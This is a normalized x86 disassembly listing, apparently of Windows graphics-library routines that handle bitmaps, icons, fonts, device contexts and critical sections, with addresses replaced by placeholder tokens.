cmp [ esi + 0x4 ] 0x1
jne r-xdata
lea eax [ ebp - 0x58 ]
push eax
push 0x54
push edi
call GetObjectA
mov eax [ esi + 0x10 ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ esi + 0x10 ]
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ esi + 0x10 ] eax
jmp r-xdata
call sub_427440
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
xor eax eax
push ebp
push sub_428833
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x58 ]
push eax
push 0x0
push 0x0
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
call sub_428098
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_42885c
push ebx
push esi
push edi
push ebp
add esp 0xffffffac
mov ebx edx
mov esi eax
mov eax esi
call sub_427ce4
cmp bl al
je r-xdata
add esp 0x54
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ esi + 0x28 ]
cmp [ edi + 0x8 ] 0x0
jne r-xdata
test bl bl
jne r-xdata
cmp [ edi + 0x14 ] 0x0
jne r-xdata
mov eax [ edi + 0x8 ]
test eax eax
je r-xdata
mov eax [ edi + 0x14 ]
test eax eax
je r-xdata
cmp bl 0x1
jne r-xdata
mov eax esi
call sub_427e28
mov eax esi
call sub_427f38
push esi
push edi
lea esi [ edi + 0x18 ]
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
xor eax eax
mov [ esp + 0x18 ] eax
cmp [ edi + 0x4 ] 0x1
sete bl
test bl bl
je r-xdata
cmp eax [ edi + 0x14 ]
jne r-xdata
mov eax esi
call sub_427e28
mov eax esi
call sub_427f38
mov eax esi
call sub_427db4
cmp [ edi + 0x4 ] 0x1
jne r-xdata
cmp eax [ edi + 0x8 ]
je r-xdata
mov [ edi + 0x30 ] 0x28
jmp r-xdata
xor eax eax
mov [ edi + 0x30 ] eax
jmp r-xdata
mov eax [ edi + 0x10 ]
call sub_427440
mov ebp eax
mov ebp [ edi + 0x10 ]
jmp r-xdata
lea eax [ edi + 0x18 ]
push eax
mov ecx [ edi + 0x10 ]
mov edx [ edi + 0x14 ]
mov eax esi
call sub_427844
jmp r-xdata
mov eax [ edi + 0x14 ]
xor edx edx
mov [ edi + 0x14 ] edx
mov ebp [ edi + 0x10 ]
xor edx edx
mov [ edi + 0x10 ] edx
lea edx [ edi + 0x18 ]
push edx
mov dl [ edi + 0x70 ]
push edx
push 0x0
mov ecx ebp
mov edx eax
mov eax esi
call sub_428098
jmp r-xdata
push esp
mov dl [ edi + 0x70 ]
push edx
push 0x0
mov ecx ebp
mov edx eax
mov eax esi
call sub_428098
mov [ edi + 0x8 ] eax
jmp r-xdata
push esp
push 0x0
mov ecx ebp
mov edx [ edi + 0x10 ]
mov eax [ edi + 0x14 ]
call sub_426ddc
test bl bl
je r-xdata
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_428994
push ebx
push esi
push edi
add esp 0xffffffac
mov edi edx
mov ebx eax
mov esi [ ebx + 0x28 ]
cmp edi [ esi + 0x20 ]
je r-xdata
add esp 0x54
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_427e38
push esi
push edi
add esi 0x18
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
mov [ esp + 0x8 ] edi
mov [ esp + 0x20 ] edi
push esp
mov ecx [ esi + 0x10 ]
mov edx [ esi + 0x8 ]
mov eax ebx
call sub_427844
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_4289e8
push ebx
push esi
push edi
add esp 0xffffffac
mov ebx edx
mov edi eax
mov esi [ edi + 0x28 ]
lea eax [ esi + 0x30 ]
cmp [ eax + 0xc ] 0x1
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ eax + 0xe ] 0x1
je r-xdata
cmp bl al
je r-xdata
mov al 0x1
add esp 0x54
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_427e38
push esi
push edi
add esi 0x18
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
xor eax eax
mov [ esp + 0x18 ] eax
xor eax eax
mov al bl
mov [ esp + 0x24 ] ax
mov [ esp + 0x26 ] ax
mov [ esp + 0x10 ] ax
mov [ esp + 0x12 ] ax
push esp
mov ecx [ esi + 0x10 ]
mov edx [ esi + 0x8 ]
mov eax edi
call sub_427844
mov edx edi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_428a68
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax [ ebx + 0x28 ]
cmp edi [ eax + 0x10 ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi eax
test edi edi
jne r-xdata
mov eax ebx
call sub_427e28
mov eax ebx
call sub_427e38
push esi
push edi
add esi 0x18
lea edi [ ebp - 0x58 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
lea eax [ ebp - 0x58 ]
push eax
push 0x0
mov edx [ esi + 0x10 ]
mov eax [ esi + 0x8 ]
mov ecx edi
call sub_426ddc
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_428aff
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x58 ]
push eax
mov al [ esi + 0x70 ]
push eax
push 0x0
mov ecx edi
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_428098
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
mov eax [ ebx + 0x28 ]
lea ecx [ eax + 0x18 ]
mov eax [ eax + 0x14 ]
mov edx edi
call sub_426cd4
mov [ ebx + 0x22 ] 0x1
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov eax [ esi + 0x10 ]
call sub_423298
xor eax eax
mov [ esi + 0x10 ] eax
jmp r-xdata
sub_428b04
mov eax [ ebp - 0x4 ]
push eax
call DeleteObject
call sub_403930
call sub_403984
mov eax [ ebx + 0x28 ]
lea ecx [ eax + 0x18 ]
mov eax [ eax + 0x14 ]
mov edx edi
call sub_426cd4
mov [ ebx + 0x22 ] 0x1
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_428b3c
push ebx
push esi
push edi
add esp 0xffffffac
mov edi edx
mov ebx eax
mov esi [ ebx + 0x28 ]
cmp edi [ esi + 0x1c ]
je r-xdata
add esp 0x54
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_427e38
push esi
push edi
add esi 0x18
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
mov [ esp + 0x4 ] edi
mov [ esp + 0x1c ] edi
push esp
mov ecx [ esi + 0x10 ]
mov edx [ esi + 0x8 ]
mov eax ebx
call sub_427844
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_428b98
push ebx
push esi
push edi
push ebp
add esp 0xfffffbd4
mov ebx ecx
mov edi edx
mov esi eax
lea eax [ esp + 0x10 ]
xor ecx ecx
mov edx 0xe
call sub_402b5c
mov [ esp + 0x10 ] 0x4d42
mov eax [ esi + 0x28 ]
mov ebp [ eax + 0x6c ]
test ebp ebp
je r-xdata
mov eax esi
call sub_427db4
mov ebp [ esi + 0x28 ]
xor eax eax
mov [ esp ] eax
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
mov eax ebp
mov edx [ eax ]
call [ edx ]
mov [ esp ] eax
test bl bl
je r-xdata
test bl bl
je r-xdata
mov edx [ ebp + 0x50 ]
push edx
lea ecx [ esp + 0x4 ]
lea edx [ esp + 0xc ]
call sub_4261d0
cmp [ ebp + 0x70 ] 0x0
je r-xdata
mov eax [ esi + 0x28 ]
mov ebx [ eax + 0x6c ]
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ ebx + 0x4 ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x10 ]
jmp r-xdata
mov edx esp
mov ecx 0x4
mov eax edi
call sub_41ad28
cmp [ esp ] 0x0
je r-xdata
mov edx esp
mov ecx 0x4
mov eax edi
call sub_41ad28
mov eax [ esp + 0x8 ]
add eax 0xe
add [ esp ] eax
lea eax [ esp + 0x10 ]
xor ecx ecx
mov edx 0xe
call sub_402b5c
mov [ esp + 0x10 ] 0x4d42
mov eax esi
call sub_427c78
mov dl [ r-xdata ]
call sub_42508c
mov eax [ ebp + 0x14 ]
push eax
mov eax [ esi + 0x2c ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
call sub_4253a4
mov [ esp + 0xc ] eax
lea eax [ esp + 0x2a ]
push eax
push 0x100
push 0x0
mov eax [ esi + 0x2c ]
mov eax [ eax + 0x4 ]
push eax
call GetDIBColorTable
mov [ esp + 0x4 ] eax
mov eax [ esp + 0xc ]
push eax
mov eax [ esi + 0x2c ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
mov eax [ ebp + 0x50 ]
test eax eax
jbe r-xdata
mov [ esp + 0x8 ] 0xc
mov ax [ ebp + 0x3e ]
cmp ax 0x8
ja r-xdata
add esp 0x42c
pop ebp
pop edi
pop esi
pop ebx
retn
lea eax [ ebp + 0x18 ]
call sub_426d90
cmp [ esp + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x70 ] 0x0
jne r-xdata
cmp eax [ esp + 0x4 ]
jae r-xdata
mov ecx eax
mov eax 0x1
shl eax cl
lea eax [ eax + eax * 2 ]
add [ esp + 0x8 ] eax
cmp [ ebp + 0x70 ] 0x0
je r-xdata
mov eax [ ebp + 0x50 ]
test eax eax
je r-xdata
mov eax [ esp ]
mov [ esp + 0x12 ] eax
mov eax [ esp + 0x8 ]
add eax 0xe
mov [ esp + 0x1a ] eax
cmp [ esp + 0x4 ] 0x0
jne r-xdata
mov [ esp + 0x4 ] eax
lea edx [ esp + 0x10 ]
mov ecx 0xe
mov eax edi
call sub_41ad28
lea edx [ ebp + 0x30 ]
mov ecx 0x28
mov eax edi
call sub_41ad28
cmp [ ebp + 0x3e ] 0x8
jbe r-xdata
lea eax [ ebp + 0x30 ]
mov [ esp + 0x1e ] 0xc
mov dx [ eax + 0x4 ]
mov [ esp + 0x22 ] dx
mov dx [ eax + 0x8 ]
mov [ esp + 0x24 ] dx
mov [ esp + 0x26 ] 0x1
mov ax [ eax + 0xe ]
mov [ esp + 0x28 ] ax
lea edx [ esp + 0x10 ]
mov ecx 0xe
mov eax edi
call sub_41ad28
lea edx [ esp + 0x1e ]
mov ecx 0xc
mov eax edi
call sub_41ad28
jmp r-xdata
mov eax [ esp + 0x4 ]
mov [ ebp + 0x50 ] eax
cmp eax [ esp + 0x4 ]
je r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
xor eax eax
mov al [ ebp + 0x70 ]
xor ecx ecx
mov cl [ eax + rw-data ]
imul ecx [ esp + 0x4 ]
lea edx [ esp + 0x2a ]
mov eax edi
call sub_41ad28
mov edx [ ebp + 0x2c ]
mov ecx [ ebp + 0x44 ]
mov eax edi
call sub_41ad28
test [ ebp + 0x40 ] 0x3
je r-xdata
lea edx [ esp + 0x4 ]
lea eax [ esp + 0x2a ]
call sub_425814
cmp [ ebp + 0x70 ] 0x0
je r-xdata
cmp [ ebp + 0x71 ] 0x0
jne r-xdata
lea edx [ ebp + 0x58 ]
mov ecx 0xc
mov eax edi
call sub_41ad28
lea edx [ esp + 0x2a ]
mov ecx 0xff
mov eax [ ebp + 0x10 ]
call sub_425b38
mov [ esp + 0x4 ] eax
cmp [ ebp + 0x3e ] 0x8
jbe r-xdata
mov eax [ esp + 0x4 ]
shl eax 0x2
add [ esp ] eax
add [ esp + 0x8 ] eax
sub_428e58
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx eax
mov [ edx ] 0x2
mov eax ebx
call sub_427e38
mov esi [ ebx + 0x28 ]
push esi
add esi 0x18
lea edi [ ebp - 0x58 ]
mov ecx 0x15
[ edi ] [ esi ]
pop esi
xor eax eax
mov [ ebp - 0x40 ] eax
xor eax eax
mov [ ebp - 0x44 ] eax
lea eax [ ebp - 0x58 ]
push eax
mov eax [ ebx + 0x2c ]
push eax
mov edi [ esi + 0x10 ]
mov ecx edi
mov edx edi
mov eax [ esi + 0x8 ]
call sub_426ddc
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
xor eax eax
push ebp
push sub_428ed2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x10 ]
call sub_427440
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_428ef8
push ebx
push esi
call sub_403508
mov ebx edx
mov esi eax
mov eax [ esi + 0xc ]
call sub_403154
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403144
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034f0
sub_428f40
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_42650c
mov [ edi + 0x21 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_403124
mov esi eax
mov [ edi + 0x28 ] esi
mov eax esi
call sub_426c08
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034a0
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_428f94
push ebx
push esi
call sub_403508
mov ebx edx
mov esi eax
mov eax [ esi + 0x28 ]
call sub_426c0c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_418b80
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034f0
sub_428fc4
push ebx
push esi
push edi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
xor ecx ecx
xor edx edx
mov eax esi
call sub_42929c
mov edi ebx
mov eax [ edi + 0x28 ]
call sub_426c08
mov eax [ esi + 0x28 ]
call sub_426c0c
mov eax [ edi + 0x28 ]
mov [ esi + 0x28 ] eax
jmp r-xdata
mov edx ebx
mov eax esi
call sub_418bac
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
sub_429024
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax esi
call sub_42508c
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_42907c
push eax
mov eax [ edi + 0x4 ]
push eax
mov eax [ edi ]
push eax
mov eax [ esi + 0x4 ]
push eax
call DrawIconEx
pop edi
pop esi
pop ebx
retn
sub_4290b8
push ebx
push esi
add esp 0xfffffff4
mov esi eax
mov ebx [ esi + 0x28 ]
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
add esp 0xc
pop esi
pop ebx
retn
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
push 0x0
push 0x0
call sub_41aae4
mov edx esp
mov ecx 0x6
mov eax [ ebx + 0xc ]
call sub_41acf0
mov ax [ esp + 0x2 ]
sub ax 0x1
jb r-xdata
mov eax [ rw-data ]
mov [ esp + 0x8 ] eax
jmp r-xdata
je r-xdata
mov eax [ esp + 0x8 ]
mov [ ebx + 0x8 ] eax
push 0x6
lea eax [ esi + 0x2c ]
push eax
lea eax [ ebx + 0x10 ]
push eax
movzx ecx [ esp + 0x10 ]
lea edx [ esp + 0x14 ]
mov eax [ ebx + 0xc ]
call sub_425de4
jmp r-xdata
jmp r-xdata
call sub_42529c
sub_429130
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi eax
mov ebx [ esi + 0x28 ]
cmp [ ebx + 0xc ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403124
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4291bd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_42907c
cmp eax [ rw-data ]
jne r-xdata
call sub_42529c
mov eax esi
call sub_42907c
mov edx eax
xor ecx ecx
mov eax [ ebp - 0x4 ]
call sub_426310
lea eax [ ebp - 0xa ]
xor ecx ecx
mov edx 0x6
call sub_402b5c
lea edx [ ebp - 0xa ]
mov ecx 0x6
mov eax [ ebp - 0x4 ]
call sub_41ad28
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_4291e4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403124
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_429272
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov edx [ eax ]
call [ edx ]
push eax
mov eax esi
call sub_41aac4
pop edx
sub edx eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax esi
call sub_41acf0
lea edx [ ebp - 0xa ]
mov ecx 0x6
mov eax [ ebp - 0x4 ]
call sub_41acf0
mov ax [ ebp - 0x8 ]
sub ax 0x2
jb r-xdata
mov ecx [ ebp - 0x4 ]
xor edx edx
mov eax ebx
call sub_42929c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_42529c
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_429277
mov eax [ ebp - 0x4 ]
call sub_403154
call sub_403930
call sub_403984
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42929c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403124
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4292dc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov [ eax + 0x8 ] esi
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] edi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_426c08
mov eax [ ebx + 0x28 ]
call sub_426c0c
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x28 ] eax
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42935c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_429130
mov eax [ ebx + 0x28 ]
mov ebx [ eax + 0xc ]
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ ebx + 0x4 ]
mov eax esi
call sub_41ad28
pop esi
pop ebx
retn
sub_4293ac
push ebx
push 0x0
call GetDC
mov ebx eax
push 0x5a
push ebx
call GetDeviceCaps
mov [ rw-data ] eax
push ebx
push 0x0
call ReleaseDC
mov eax rw-data
mov edx 0xf
call sub_4258e4
mov [ rw-data ] eax
pop ebx
retn
sub_4293e4
push ebx
push esi
add esp 0xffffffc8
mov bl 0x1
push 0x0
call GetDC
mov esi eax
test esi esi
je r-xdata
mov eax ebx
add esp 0x38
pop esi
pop ebx
retn
mov eax [ rw-data ]
push eax
push esi
call SelectObject
test eax eax
je r-xdata
push esi
push 0x0
call ReleaseDC
push esp
push esi
call GetTextMetricsA
test eax eax
je r-xdata
mov bl [ esp + 0x34 ]
sub_429428
push ebx
push esi
push edi
push 0x48
mov eax [ rw-data ]
push eax
push 0x8
call MulDiv
neg eax
mov [ rw-data ] eax
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
call sub_4293e4
mov ebx eax
mov eax ebx
sub al 0x80
jne r-xdata
mov esi r-xdata
mov edi rw-data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push 0x48
mov eax [ rw-data ]
push eax
push 0x9
call MulDiv
neg eax
mov [ rw-data ] eax
mov [ rw-data ] bl
sub_4294f4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
lea eax [ esi + 0x8 ]
push eax
call InitializeCriticalSection
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034a0
mov eax esi
pop esi
pop ebx
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_42952c
push ebx
push esi
call sub_403508
mov ebx edx
mov esi eax
mov eax esi
call sub_429724
lea eax [ esi + 0x8 ]
push eax
call DeleteCriticalSection
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034f0
sub_429570
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_429558
xor eax eax
push ebp
push sub_429611
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp ebx [ eax + 0x8 ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_429618
mov eax [ ebp - 0x4 ]
call sub_429564
retn
mov eax 0x10
call sub_4026dc
mov [ ebp - 0x8 ] eax
mov edi [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ edi ] eax
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_429624
mov [ edi + 0x4 ] eax
mov [ edi + 0x8 ] ebx
mov [ edi + 0xc ] esi
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
cmp esi [ eax + 0xc ]
jne r-xdata
sub_429624
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4276b0
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_429703
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx 0x8
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx 0x8
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x8 ]
call sub_427c78
mov edi eax
mov eax [ edi + 0x14 ]
xor edx edx
call sub_424910
mov eax [ edi + 0x14 ]
mov edx ebx
call sub_4247f4
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
xor edx edx
xor eax eax
call sub_416f24
lea edx [ ebp - 0x18 ]
mov eax edi
call sub_424b98
xor esi esi
mov edx ebx
and edx 0x80000001
jns r-xdata
dec eax
or eax 0xfffffffe
inc eax
cmp eax edx
jne r-xdata
dec edx
or edx 0xfffffffe
inc edx
inc ebx
cmp ebx 0x9
jne r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov ecx esi
mov edx ebx
mov eax edi
call sub_424f70
mov eax esi
and eax 0x80000001
jns r-xdata
inc esi
cmp esi 0x9
jne r-xdata
xor ebx ebx
mov eax [ ebp - 0x8 ]
call sub_427934
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_429724
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
jne r-xdata
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_429558
xor eax eax
push ebp
push sub_42976f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_429776
mov eax [ ebp - 0x4 ]
call sub_429564
retn
mov esp ebp
pop ebp
retn
sub_429776
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
call sub_4026fc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
jne r-xdata
call sub_403154
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_429558
xor eax eax
push ebp
push sub_42976f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_429776
mov eax [ ebp - 0x4 ]
call sub_429564
retn
mov esp ebp
pop ebp
retn
sub_42979c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax esi
call sub_423b68
push eax
mov eax ebx
call sub_423b68
mov edx eax
mov eax [ rw-data ]
pop ecx
call sub_429570
mov eax [ eax + 0x4 ]
pop esi
pop ebx
retn
sub_4297d4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42989d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4298a4
retn
mov eax [ rw-data ]
call sub_403154
mov eax [ rw-data ]
call sub_403154
mov eax [ rw-data ]
call sub_403154
call sub_4268ec
mov eax [ rw-data ]
call sub_403154
mov eax [ rw-data ]
call sub_403154
mov eax [ rw-data ]
call sub_403154
mov eax [ rw-data ]
call sub_403154
mov eax [ rw-data ]
call sub_403154
mov eax [ rw-data ]
push eax
call DeleteObject
push rw-data
call DeleteCriticalSection
push rw-data
call DeleteCriticalSection
mov eax rw-data
mov ecx 0x12
mov edx [ r-xdata ]
call sub_4049cc
mov eax rw-data
mov ecx 0x34
mov edx [ r-xdata ]
call sub_4049cc
sub_4298a8
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_4293ac
push rw-data
call InitializeCriticalSection
push rw-data
call InitializeCriticalSection
push 0x7
call GetStockObject
mov [ rw-data ] eax
push 0x5
call GetStockObject
mov [ rw-data ] eax
push 0xd
call GetStockObject
mov [ rw-data ] eax
push 0x7f00
push 0x0
call LoadIconA
mov [ rw-data ] eax
call sub_429428
mov cx 0x2c
mov dl 0x1
mov eax [ sub_4232ac ]
call sub_423320
mov [ rw-data ] eax
mov cx 0x10
mov dl 0x1
mov eax [ sub_4232ac ]
call sub_423320
mov [ rw-data ] eax
mov cx 0x10
mov dl 0x1
mov eax [ sub_4232ac ]
call sub_423320
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4294f4
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41881c
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41881c
mov [ rw-data ] eax
mov ecx sub_423b78
mov edx sub_423b88
mov eax [ r-xdata ]
call sub_417d70
mov ecx r-xdata
mov edx sub_423d90
mov eax [ r-xdata ]
call sub_417d70
sub_4299b4
push ebp
mov ebp esp
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4299e0
retn
sub_429a29
xor eax [ eax ]
in al dx
xor [ eax ] al
or [ ecx ] dh
inc eax
add [ esp + eax * 4 ] dh
inc ecx
add al bl
test [ ecx ] eax
je r-xdata
jmp sub_4038d0
inc edx
add [ eax + 0x4004184 ] cl
test [ ecx ] eax
or edx [ edi + ecx * 2 + 0x62 ]
push 0x65
arpl [ esp + ecx * 2 + 0x69 ] si
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
